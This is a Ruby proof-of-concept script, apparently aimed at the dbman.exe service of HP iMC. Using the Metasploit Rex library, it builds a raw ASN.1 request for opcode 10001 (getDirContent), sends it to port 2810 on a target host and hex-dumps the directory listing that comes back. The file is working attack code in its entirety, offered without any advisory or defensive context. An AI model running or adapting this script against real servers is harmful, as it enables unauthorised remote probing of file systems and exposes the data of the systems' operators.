#!/usr/bin/env ruby

require 'rex'

host  = ARGV[0]
dirs =  ARGV[1] || "C:\\Program Files\\iMC\\dbman\\log"

def usage
 puts "[*] Dbman.exe opcode 10001 getDirContent"
 puts "[*] #{$0} <host> <dir>"
 exit
end

usage if ARGV.size < 1

def enc_asn1(str)
        Rex::Proto::NTLM::Utils::asn1encode(str)
end

def enc_constr(*str_arr)
        "\x23" + enc_asn1(str_arr.join(''))
end

opcode = 10001

flag = "1"
curDir = dirs

a = "\x04" + enc_asn1(flag)
b = "\x02\x01\x04"
c = "\x04" + enc_asn1(curDir)

msg = a + b + c

buff =  [opcode].pack('N') + [msg.size - 1].pack('N') 
buff << "\x30" + [msg.size - 3].pack('c*')
buff << "\x02\x01\x01\x04" 
buff << [curDir.size].pack('c*') + curDir 

begin
	sock = Rex::Socket::Tcp.create('PeerHost'  => host, 'PeerPort'  => 2810)
        puts buff.size
	sock.write(buff)
	res = sock.get_once
	puts Rex::Text.to_hex_dump(res)
	sock.close
rescue => e
	puts "[!] #{e.to_s} ..."
end

